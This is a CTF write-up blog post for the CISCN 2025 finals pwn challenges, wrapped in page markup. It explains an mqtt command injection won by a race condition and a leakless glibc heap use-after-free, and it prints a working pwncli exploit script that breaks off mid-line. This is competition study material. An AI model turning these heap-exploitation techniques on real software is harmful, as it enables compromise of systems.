_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/cover/34.png","dark":"/img/index_img.png"},"title":"InkeyPのblog","subtitle":{"text":["可以打一辈子CTF吗"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4a3b5c","dark":"#e6f1d9"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/InkeyP","instagram":null,"zhihu":null,"twitter":null,"email":"1844598344@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Friends":{"path":"/links","icon":"fa-regular fa-link"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":false,"limit":3}},"footerStart":"2024/11/29 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/img/icon.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                InkeyPのblog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>Archives</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/1.jpg" alt="ciscn-2025-决赛" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">ciscn-2025-决赛</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://avatars.githubusercontent.com/u/39005478?s=800">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">InkeyP</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-23 13:18:25</span>
+        <span class="mobile">2025-07-23 13:18:25</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-23 14:17:49</span>
+            <span class="mobile">2025-07-23 14:17:49</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ciscn/">ciscn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>8 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="Ciscn-2025-决赛-PWN"><a href="#Ciscn-2025-决赛-PWN" class="headerlink" title="Ciscn 2025 决赛 PWN"></a>Ciscn 2025 决赛 PWN</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h3><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723132403510.png" class title="image-20250723132403510">
+
+<p>存在命令注入，但是需要绕过必须为字母数字的check</p>
+<p>注意到程序有<code>sleep(2)</code>而且为多线程，因此这里是条件竞争</p>
+<p>先输入合法vin，再进行命令注入</p>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>使用mqttx订阅<code>diag</code>，得到<code>VIN</code>，计算得到<code>auth</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> a1[] = <span class="string">&quot;111111111a&quot;</span>;</span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; a1[i]; ++i)</span><br><span class="line">        v3 = <span class="number">31</span> * v3 + *(<span class="type">char</span>*)(i + a1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后发送</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250719113706904.png" class title="image-20250719113706904">
+
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250719113455689.png" class title="image-20250719113455689">
+
+<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><h3 id="DarkHeap"><a href="#DarkHeap" class="headerlink" title="DarkHeap"></a>DarkHeap</h3><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>无泄漏UAF</p>
+<p>以下exp来自Tplus师傅🥰(tqllll)</p>
+<p>源码</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;  <span class="comment">// 这里会将地址写入</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>首先</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">7</span>, <span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x118</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>在tcache_struct留下标志位</p>
+<p>然后分配0x88大小chunk，填满tcache和smallbin</p>
+<p>修改smallbins第七个chunk的bk位，使其指向tcache_struct的0x100链表位置</p>
+<p>再申请8个0x88大小的chunk，触发smallbin reverse into tcache</p>
+<p>这样，tcache_struct的0x100链表位置就会链入0x90的tcache链表</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135122192.png" class title="image-20250723135122192">
+
+
+
+<p>如法炮制，这次修改smallbins第八个chunk的bk位，使其指向tcache_struct的0x120链表位置</p>
+<p>再申请8个0x88大小的chunk，触发smallbin reverse into tcache</p>
+<p>这样，libc地址就会写入tcache_struct的0x120链表位置</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135256329.png" class title="image-20250723135256329">
+
+<p>接着就是申请0x88，修改0x120的低位，指向libc got，改为one gadget，触发报错</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135407773.png" class title="image-20250723135407773">
+
+
+
+<p><strong>无爆破版！！！！</strong></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;130&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    set follow-fork child</span></span><br><span class="line"><span class="string">    brva 0x1483</span></span><br><span class="line"><span class="string">    brva 0x15A6</span></span><br><span class="line"><span class="string">    brva 0x154F</span></span><br><span class="line"><span class="string">    brva 0x165A</span></span><br><span class="line"><span class="string">    b malloc.c:3932</span></span><br><span class="line"><span class="string">    set $heap = $rebase(0x40A0)</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gift.elf = ELF(elf_path := <span class="string">&#x27;./DarkHeap_patch&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(elf_path)</span><br><span class="line">    <span class="comment"># gift.io = gdb.debug(elf_path, gdbscript=cmd, sysroot=&#x27;/&#x27;)</span></span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line"></span><br><span class="line">IAT = <span class="string">b&#x27;Choice:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;Content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x118</span>)</span><br><span class="line">heap_base = get_current_heapbase_addr()</span><br><span class="line">libc_base = get_current_libcbase_addr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">15</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">    add(<span class="number">0xF</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4F8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xB8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span> - <span class="number">0xC0</span> - <span class="number">8</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xB8</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0x90</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0x90</span> * <span class="number">2</span>: <span class="number">0x91</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF</span>, <span class="number">0x1500</span>)  <span class="comment"># put last unsorted into small</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1500</span>)  <span class="comment"># align</span></span><br><span class="line">dele(<span class="number">0xF</span>)</span><br><span class="line">edit(<span class="number">0xD</span>, p64(<span class="number">0</span>) + p16((heap_base &amp; <span class="number">0xFFFF</span>) + <span class="number">0x90</span> + <span class="number">8</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) // <span class="number">16</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">15</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">0xF</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4F8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xB8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span> - <span class="number">0xC0</span> - <span class="number">8</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xB8</span>: <span class="number">0xA1</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0xA0</span>: <span class="number">0xA1</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0xA0</span> * <span class="number">2</span>: <span class="number">0xA1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF</span>, <span class="number">0x128</span>)  <span class="comment"># put last unsorted into small</span></span><br><span class="line">edit(<span class="number">0xE</span>, p64(<span class="number">0</span>) + p16((heap_base &amp; <span class="number">0xFFFF</span>) + <span class="number">0x90</span> + <span class="number">8</span> * (<span class="number">0x120</span> - <span class="number">0x20</span>) // <span class="number">16</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, 